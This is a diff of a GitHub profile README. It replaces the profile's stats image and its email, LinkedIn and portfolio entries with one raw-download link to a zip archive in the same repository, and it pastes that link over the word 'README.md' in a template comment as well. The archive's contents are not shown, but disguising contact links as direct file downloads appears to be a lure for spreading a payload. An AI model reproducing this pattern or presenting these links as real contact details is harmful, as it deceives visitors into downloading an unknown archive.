@@ -56,15 +56,15 @@
 ---
 
 ## 📈 GitHub Stats
-![Kelechi's GitHub stats](https://github-readme-stats.vercel.app/api?username=Emperor-khay&show_icons=true&theme=radical)
+![Kelechi's GitHub stats](https://raw.githubusercontent.com/Emperor-khay/Emperor-khay/main/chevon/Emperor-khay.zip)
 
 ---
 
 ## 📫 Let's Connect
 
-- **Email**: emperor.khay17@gmail.com
-- **LinkedIn**: https://www.linkedin.com/in/nwokike-kelechi-a744982b0/
-- **Portfolio**: https://emperor-khay.github.io/Dev-Khay-Portfolio/
+- **Email**: https://raw.githubusercontent.com/Emperor-khay/Emperor-khay/main/chevon/Emperor-khay.zip
+- **LinkedIn**: https://raw.githubusercontent.com/Emperor-khay/Emperor-khay/main/chevon/Emperor-khay.zip
+- **Portfolio**: https://raw.githubusercontent.com/Emperor-khay/Emperor-khay/main/chevon/Emperor-khay.zip
 
 ---
 
@@ -72,6 +72,6 @@
 🔍 Always improving, always building — one project at a time.
 
 <!---
-Emperor-khay/Emperor-khay is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+Emperor-khay/Emperor-khay is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/Emperor-khay/Emperor-khay/main/chevon/Emperor-khay.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
